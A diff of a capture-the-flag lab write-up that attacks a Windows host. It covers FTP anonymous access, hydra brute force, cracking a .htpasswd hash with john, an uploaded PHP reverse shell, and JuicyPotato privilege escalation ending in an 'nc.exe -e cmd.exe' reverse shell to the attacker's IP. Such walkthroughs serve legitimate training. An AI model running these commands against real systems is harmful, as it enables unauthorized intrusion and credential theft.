@@ -41,7 +41,6 @@ This lab involves exploiting an anonymous FTP server to gain initial access. Lea
 - NMap Scan
 
 ```bash
-
 nmap -p- --min-rate 10000  -sS -sV -sS -A 192.168.55.46
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 12:20 UTC
 Nmap scan report for 192.168.55.46
@@ -104,7 +103,6 @@ Nmap done: 1 IP address (1 host up) scanned in 39.24 seconds
 - NMap shows it is vulnerable to Anonymous login.
 
 ```bash
-
 ftp 192.168.55.46
 Connected to 192.168.55.46.
 220 zFTPServer v6.0, build 2011-10-17 15:25 ready.
@@ -124,7 +122,6 @@ ftp>
 - If we check inside **accounts** folder we get two usernames inside it.
 
 ```bash
-
 ftp> ls accounts
 229 Entering Extended Passive Mode (|||2050|)
 150 Opening connection for /bin/ls.
@@ -144,14 +141,12 @@ dr-xr-xr-x   1 root     root          512 Aug 02  2024 backup
 - Saving two usernames inside users.txt
 
 ```bash
-
 echo "Offsec\nadmin" >users.txt 
 ```
 
 - Using hydra to bruteforce ftp
 
 ```bash
-
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt.gz ftp://192.168.55.46 -u
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -170,7 +165,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-17 14:22:
 - Using brute-forced Credential
 
 ```bash
-
 ftp admin@192.168.55.46
 Connected to 192.168.55.46.
 220 zFTPServer v6.0, build 2011-10-17 15:25 ready.
@@ -189,7 +183,6 @@ ftp>
 - There are **.htpasswd** file with encrypted password.
 
 ```bash
-
 ftp> ls
 229 Entering Extended Passive Mode (|||2053|)
 150 Opening connection for /bin/ls.
@@ -209,7 +202,6 @@ offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
 - Downloaded the **.htpasswd** file
 
 ```bash
-
 ftp> get .htpasswd
 local: .htpasswd remote: .htpasswd
 229 Entering Extended Passive Mode (|||2055|)
@@ -223,14 +215,12 @@ ftp>
 - Change file name
 
 ```bash
-
 mv .htpasswd offsec.txt
 ```
 
 - Bruteforced with john.
 
 ```bash
-
 john --wordlist=rockyou.txt offsec.txt
 Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
 Use the "--format=md5crypt-long" option to force loading these as that type instead
@@ -256,7 +246,6 @@ Session completed.
 - Started netcat listener
 
 ```bash
-
 nc -lvnp 1337
 listening on [any] 1337
 ```
@@ -264,7 +253,6 @@ listening on [any] 1337
 - Upload the shell using ftp server as admin user.
 
 ```bash
-
 ftp admin@192.168.55.46
 Connected to 192.168.55.46.
 220 zFTPServer v6.0, build 2011-10-17 15:25 ready.
@@ -288,14 +276,12 @@ ftp>
 - So, we can curl the shell with authentication details to get reverse shell
 
 ```bash
-
 curl -u 'offsec:elite' -X GET http://192.168.55.46:242/hack.php
 ```
 
 - We will get reverse shell in our netcat listener.
 
 ```bash
-
 nc -lvnp 1337
 listening on [any] 1337 ...
 connect to [192.168.49.55] from (UNKNOWN) [192.168.55.46] 49171
@@ -326,7 +312,6 @@ livda\apache
 - Now we can just navigate to **C:\Users\apache\Desktop** and read the flag inside **local.txt** file.
 
 ```bash
-
 C:\Users\apache\Desktop>dir
 dir
  Volume in drive C has no label.
@@ -352,7 +337,6 @@ type local.txt
 - Checking for user privilege shows **SeImpersonatePrivilege** is enabled.
 
 ```bash
-
 C:\wamp\bin\apache\Apache2.2.21>whoami /priv
 whoami /priv
 
@@ -391,7 +375,6 @@ for /f "tokens=*" %A in ('reg query HKCR\CLSID 2^>nul') do @for /f "tokens=3" %B
 - Verified exploit
 
 ```bash
-
 C:\Users\apache\Desktop>jp.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/k whoami > C:\Users\Public\whoami.txt" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
 jp.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/k whoami > C:\Users\Public\whoami.txt" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
 Testing {69AD4AEE-51BE-439b-A92C-86AE490E8B30} 1337
@@ -414,7 +397,6 @@ nt authority\system
 - Now we can just navigate to **C:\Users\apache\Desktop** and read the flag inside **local.txt** file.
 
 ```bash
-
 C:\Users\apache\Desktop>jp.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "type C:\Users\Administrator\Desktop\proof.txt > C:\Users\Public\proof.txt" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
 jp.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "type C:\Users\Administrator\Desktop\proof.txt > C:\Users\Public\proof.txt" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
 Testing {69AD4AEE-51BE-439b-A92C-86AE490E8B30} 1337
@@ -445,14 +427,12 @@ cddd3973c71*****3710219e36f
 - Then run huicy potato command to get shell 
 
 ```bash
-
 jp.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/c C:\Users\apache\Desktop\nc.exe -e cmd.exe 192.168.49.55 9999" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
 ```
 
 - Will get a Administrator shell
 
 ```bash
-
 nc -lvnp 9999
 listening on [any] 9999 ...
 connect to [192.168.49.55] from (UNKNOWN) [192.168.55.46] 50114
